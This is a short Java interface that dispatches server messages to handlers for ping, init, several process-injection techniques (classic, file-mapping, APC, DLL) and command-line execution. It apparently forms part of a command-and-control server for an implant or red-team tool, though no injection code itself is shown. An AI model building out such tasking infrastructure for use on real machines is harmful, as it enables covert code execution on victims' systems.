package org.server.handle;

import org.server.message.Message;
import org.server.message.MessageType;

import java.util.HashMap;

import static org.server.message.MessageType.*;

public interface Handler {

    static Handler getHandle(Message message)
    {
        switch (message.getType())
        {
            case PING:
                return new PingHandler();
            case INIT:
                return new InitHandler();
            case CLASSIC_INJECTION:
                return new ClassicInjectionHandler();
            case FILE_MAPPING_INJECTION:
                return new FileMappingInjectionHandler();
            case APC_TASK_INJECTION:
                return new APCInjectionHandler();
            case DLL_INJECTION:
                return new DLLInjectionHandler();
            case COMMAND_LINE_EXECUTION:
                return new CommandLineTaskHandler();
            default:
                return null;
        }
    }

    byte[] handle();
}
